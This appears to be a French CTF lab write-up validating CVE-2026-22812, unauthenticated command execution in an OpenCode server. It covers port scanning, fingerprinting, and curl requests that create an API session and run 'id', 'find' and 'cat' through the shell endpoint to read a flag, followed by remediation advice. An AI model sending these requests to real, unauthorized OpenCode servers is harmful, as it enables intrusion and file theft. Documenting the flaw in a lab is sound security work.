---
layout: single
header:
  overlay_image: /assets/images/banner-014.jpg
  overlay_filter: 0.6
toc: true
toc_depth: 6
toc_label: Table of Contents
title: "Lab OpenCode : validation de CVE-2026-22812 et récupération du flag (RCE non authentifiée)"
date: 2026-10-21
categories: [Web, Cybersécurité]
tags: [opencode, cve-2026-22812, rce, command-execution, api, secdojo, ctf, pentest]
---
**Lab OpenCode : `validation de CVE-2026-22812` 
**Cible déclarée :** `176.16.163.253`  
**Interface observée :** `http://176.16.163.253:4096/`  
**Contexte :** lab autorisé; la preuve d’exécution a été limitée à `id`, suivie de la recherche et de la lecture du fichier de flag.  
**Résultat :** l’API OpenCode a exécuté une commande sous `codesource` et le fichier `/home/local.txt` a révélé le flag.

> **Précaution de publication :** l’identifiant de session API a été omis. Les réponses JSON sont résumées pour ne pas exposer inutilement les identifiants de messages et de session.

## 1. Résumé du résultat

La reconnaissance initiale a trouvé SSH sur le port 22. Le port 443 refusait la connexion HTTP. Une énumération de tous les ports TCP a ensuite découvert le port `4096/tcp`; WhatWeb et une requête cURL ont montré que ce port sert une interface web intitulée **OpenCode**.

Dans le cadre autorisé, une session a été créée par l’API puis la commande inoffensive `id` a été exécutée au moyen de l’endpoint shell. La réponse a indiqué `uid=1001(codesource) gid=1001(codesource)`. Une recherche limitée aux noms de fichiers susceptibles de contenir le flag a trouvé `/home/local.txt`. La lecture de ce fichier a renvoyé :

```text
flag_fab05cce_77d9_4a58_8e02_141b3c8265d3
```

Ces résultats confirment qu’une commande distante non authentifiée a été exécutée dans l’environnement du service exposé. Ils sont compatibles avec CVE-2026-22812, mais les sorties partagées ne montrent pas la version précise d’OpenCode. La présence de l’interface et la réussite de l’API ne permettent donc pas, à elles seules, de certifier la version affectée; l’avis GitHub indique que les versions antérieures à `1.0.216` sont concernées et que `1.0.216` corrige la faille [1].

## 2. CVE-2026-22812 en bref

L’avis GitHub décrit un serveur HTTP OpenCode démarré sans authentification. Il expose notamment un endpoint de session permettant l’exécution de commandes (`POST /session/:id/shell`), ainsi que d’autres fonctions liées aux terminaux et aux fichiers. Selon cet avis, le serveur peut écouter sur le port `4096` ou un port suivant; la configuration `--mdns` peut étendre l’écoute à toutes les interfaces réseau. L’avis classe la vulnérabilité comme de haute sévérité, avec un score CVSS 3.1 de 8.8 [1].

La version corrigée publiée dans l’avis est `1.0.216`; les versions affectées sont `opencode-ai` antérieures à celle-ci [1]. Dans ce lab, la preuve comportementale est l’exécution de `id` via l’API. Elle établit l’impact du service observé, mais ne remplace pas une vérification de version pour attribuer techniquement le résultat à une version précise de la CVE.

## 3. Méthode et lien entre les étapes

La séquence suivie est :

1. repérer les ports ouverts;
2. corriger le port après l’échec de la requête vers 443;
3. reconnaître l’application OpenCode sur 4096;
4. créer une session API;
5. exécuter une preuve minimale avec `id`;
6. localiser le fichier du lab par son nom;
7. lire le fichier trouvé.

Chaque étape réduit une incertitude nécessaire à la suivante. L’identification du port permet de joindre la bonne application; l’identification d’OpenCode permet de viser son API plutôt que d’essayer des services sans rapport; `id` vérifie l’exécution avant la recherche du fichier; enfin, le chemin réel est utilisé pour la lecture du flag. Les commandes `opencode --version`, `ps` et `ss` de la capture ont été lancées sur Kali, et non sur l’hôte distant : elles ne déterminent donc ni la version d’OpenCode ni les processus de la cible.

## 4. Étape 1 — Scan initial

### Commande

```bash
nmap -A 176.16.163.253
```

### Sortie pertinente

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.2p1 Ubuntu 2ubuntu3
...
Service Info: OS: Linux
```

### Pourquoi cette étape

Le scan initial identifie les services accessibles et leurs ports. Il a indiqué que SSH était ouvert, mais n’a pas trouvé l’application web sur le port 443. Le scan par défaut de Nmap porte sur un ensemble courant de ports, pas nécessairement sur tous les ports TCP; il fallait donc poursuivre l’énumération lorsque WhatWeb a échoué sur 443.

### Interprétation

La présence de SSH fournit un indice sur le système, mais ne justifie pas de tenter une connexion SSH ni ne permet d’identifier la vulnérabilité web. Le scan n’a pas donné de version OpenCode.

## 5. Étape 2 — Échec sur le port 443

### Commande

```bash
whatweb -a 3 http://176.16.163.253:443
```

### Sortie

```text
ERROR Opening: http://176.16.163.253:443
- Connection refused - connect(2) for "176.16.163.253" port 443
```

### Pourquoi cette étape

WhatWeb effectue une requête HTTP pour obtenir les en-têtes et indices applicatifs. Ici, la connexion TCP au port 443 a été refusée : contrairement au premier lab Northstar, il n’y avait pas de serveur HTTP accessible sur ce port.

### Relation avec l’étape suivante

Il fallait chercher le service sur d’autres ports plutôt que répéter la même requête sur 443. L’énumération complète a découvert le port 4096.

## 6. Étape 3 — Énumération complète des ports TCP

### Commande

```bash
nmap -Pn -p- --open -T3 176.16.163.253
```

### Sortie

```text
PORT     STATE SERVICE
22/tcp   open  ssh
4096/tcp open  bre
```

### Explication des options

- `-Pn` demande à Nmap de ne pas effectuer de découverte d’hôte préalable;
- `-p-` parcourt tous les ports TCP;
- `--open` n’affiche que les ports trouvés ouverts;
- `-T3` choisit une vitesse de scan modérée.

### Interprétation

Le service générique `bre` est l’étiquette attribuée par la base de services de Nmap au port 4096; ce n’est pas encore une identification fiable de l’application. Il fallait donc interroger ce port avec des outils HTTP.

## 7. Étape 4 — Identifier OpenCode sur le port 4096

### Commande WhatWeb

```bash
whatweb -a 3 http://176.16.163.253:4096
```

### Sortie

```text
http://176.16.163.253:4096 [200 OK] Country[SAUDI ARABIA][SA], HTML5,
IP[176.16.163.253], Script[module], Title[OpenCode],
UncommonHeaders[content-security-policy]
```

### Interprétation

Le statut `200 OK` et le titre `OpenCode` indiquent qu’une interface web répond sur ce port. La sortie ne donne toutefois pas la version du logiciel. L’indication de pays est une géolocalisation estimée par WhatWeb, et non une preuve de l’emplacement physique du serveur.

### Vérification avec cURL

```bash
curl -i --max-time 3 http://176.16.163.253:4096/
```

### Sortie HTTP utile

```text
HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
Content-Security-Policy: default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; media-src 'self' data:; connect-src 'self' data:
Vary: Origin
Content-Length: 2365
```

Le HTML retourné comprenait :

```html
<title>OpenCode</title>
<script type="module" crossorigin src="/assets/index-D3Prp8AE.js"></script>
<link rel="stylesheet" crossorigin href="/assets/index-BxQEOW35.css">
<div id="root" class="flex flex-col h-dvh p-px"></div>
```

Le navigateur exécute l’interface à partir d’un bundle JavaScript; le HTML seul ne montre pas les routes API ni la version serveur. Le titre a cependant confirmé l’identité du produit et justifié la consultation de l’avis CVE correspondant.

### Note sur les commandes locales de Kali

Les commandes ci-dessous figuraient aussi dans la capture :

```bash
opencode --version
ps -ef | grep -i '[o]pencode'
ss -lntp
```

`opencode --version` a répondu `Command 'opencode' not found`. Les sorties de `ss -lntp` décrivaient des ports locaux de Kali (notamment des ports VNC et des ports 55555–55557), pas les ports de `176.16.163.253`. Ces commandes ne permettent donc pas de connaître la version ou l’état des processus du serveur distant.

## 8. Étape 5 — Créer une session OpenCode

L’avis GitHub décrit un endpoint de création de session, puis un endpoint shell associé à l’identifiant de cette session [1]. Les commandes ont été exécutées depuis Kali contre l’hôte autorisé.

### Définir l’API et créer la session

```bash
API='http://176.16.163.253:4096'

SESSION_JSON=$(curl -sS -X POST "$API/session" \
  -H 'Content-Type: application/json' \
  -d '{}') || exit 1

echo "$SESSION_JSON"

SESSION_ID=$(printf '%s' "$SESSION_JSON" |
  python3 -c 'import json,sys; print(json.load(sys.stdin)["id"])') || exit 1
```

La réponse de création n’est pas reproduite dans les éléments reçus. L’identifiant a été extrait du champ JSON `id` et conservé dans `SESSION_ID` pour les appels suivants. Il est omis de ce rapport car il s’agit d’un identifiant de session temporaire.

### Rôle de cette étape

L’API demande un identifiant de session pour adresser l’endpoint shell. Cette étape prépare cet identifiant; elle n’exécute pas encore la commande de preuve.

## 9. Étape 6 — Preuve minimale avec `id`

### Commande

```bash
curl -i -sS -X POST "$API/session/$SESSION_ID/shell" \
  -H 'Content-Type: application/json' \
  -d '{"agent":"build","command":"id"}'
```

### Sortie pertinente, résumée à partir de la réponse JSON

```text
HTTP/1.1 200 OK
...
"tool":"bash"
"input":{"command":"id"}
"output":"uid=1001(codesource) gid=1001(codesource) groups=1001(codesource)\n"
```

### Pourquoi cette étape

`id` est une commande de vérification à faible impact : elle affiche l’identité du processus qui exécute les commandes et ne modifie pas le système. Le statut HTTP seul aurait indiqué que l’API répond, mais c’est le résultat `uid=1001(codesource)` dans la sortie de l’outil `bash` qui prouve que la commande a été exécutée côté serveur.

### Conclusion intermédiaire

L’exécution s’est faite sous le compte `codesource`, pas en tant que `root`. La réponse est cohérente avec une exécution arbitraire de commande via le serveur OpenCode décrit dans l’avis. Elle ne révèle pas la version précise installée; la preuve porte sur l’impact effectif dans ce lab.

## 10. Étape 7 — Chercher le fichier du flag

Après le succès de la preuve `id`, une recherche par noms de fichiers usuels de lab a été envoyée via le même endpoint shell.

### Commande

```bash
CMD='find / -maxdepth 5 -type f \( -iname "*flag*" -o -name local.txt -o -name user.txt \) -print 2>/dev/null'
PAYLOAD=$(python3 -c 'import json,sys; print(json.dumps({"agent":"build","command":sys.argv[1]}))' "$CMD")

curl -sS -X POST "$API/session/$SESSION_ID/shell" \
  -H 'Content-Type: application/json' \
  -d "$PAYLOAD"
```

### Sortie utile extraite de la réponse JSON

```text
/sys/module/scsi_mod/parameters/default_dev_flags
/usr/share/man/man5/proc_kpageflags.5.gz
/usr/share/bash-completion/completions/chflags
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/kpageflags
/home/local.txt
```

### Explication

`find /` parcourt l’arborescence à partir de la racine; `-maxdepth 5` limite la profondeur pour garder la recherche circonscrite; les critères retiennent les noms contenant `flag`, ainsi que les noms fréquents `local.txt` et `user.txt`. La redirection `2>/dev/null` écarte les erreurs d’accès des répertoires non lisibles. Les chemins système contenant simplement le mot `flags` ne sont pas des flags de CTF. Le résultat utile est `/home/local.txt`.

La recherche a été effectuée après la preuve d’exécution; elle n’a pas modifié de fichiers.

## 11. Étape 8 — Corriger le chemin d’exemple puis lire le flag

Une tentative a d’abord utilisé le texte d’exemple `/CHEMIN/RENVOYE` au lieu d’un chemin existant. La réponse était :

```text
cat: /CHEMIN/RENVOYE: No such file or directory
```

Cette erreur ne signale pas un échec de l’API; elle indique seulement que le chemin exemple n’existe pas. Après l’avoir remplacé par le chemin découvert, la commande suivante a été exécutée :

```bash
CMD='cat -- /home/local.txt'
PAYLOAD=$(python3 -c 'import json,sys; print(json.dumps({"agent":"build","command":sys.argv[1]}))' "$CMD")

curl -sS -X POST "$API/session/$SESSION_ID/shell" \
  -H 'Content-Type: application/json' \
  -d "$PAYLOAD"
```

### Sortie utile extraite de la réponse JSON

```text
"input":{"command":"cat -- /home/local.txt"}
"output":"flag_fab05cce_77d9_4a58_8e02_141b3c8265d3\n"
```

La commande `cat --` affiche le fichier et traite le chemin suivant comme un argument, même s’il pouvait commencer par un tiret. Le flag était ainsi lisible par le processus qui exécutait les commandes.

## 12. Conclusion et remédiation

Le lab a exposé une interface OpenCode sur `176.16.163.253:4096`. L’API a accepté la création d’une session et la commande `id` a été exécutée sans authentification apparente par le compte `codesource`. La recherche a localisé `/home/local.txt`, dont la lecture a fourni le flag. Cela démontre une exécution de commande distante dans le scénario testé.

Pour attribuer strictement le cas à CVE-2026-22812, il faudrait relever la version côté serveur ou confirmer l’image/package déployé. La sortie WhatWeb ne fournit pas cette version. L’avis GitHub indique que les versions `opencode-ai` antérieures à `1.0.216` sont affectées et que `1.0.216` corrige le problème [1]. La remédiation recommandée est donc de mettre à jour vers `1.0.216` ou une version ultérieure, puis de vérifier que le serveur n’est pas exposé sans authentification sur une interface réseau accessible. Restreindre l’écoute au localhost ou appliquer une protection d’accès en amont réduit l’exposition; l’avis indique que le mode `--mdns` peut étendre l’écoute réseau [1].

La preuve démontrée ici a été limitée aux commandes `id`, `find` pour localiser le fichier de lab et `cat` sur ce fichier. Aucun shell interactif, persistance, changement de configuration ou lecture d’autres fichiers applicatifs n’a été nécessaire.

## Références

- https://github.com/advisories/GHSA-vxw4-wv6m-9hhh "GitHub Security Advisory GHSA-vxw4-wv6m-9hhh pour CVE-2026-22812"  
- https://www.cve.org/CVERecord?id=CVE-2026-22812 "CVE Record CVE-2026-22812"
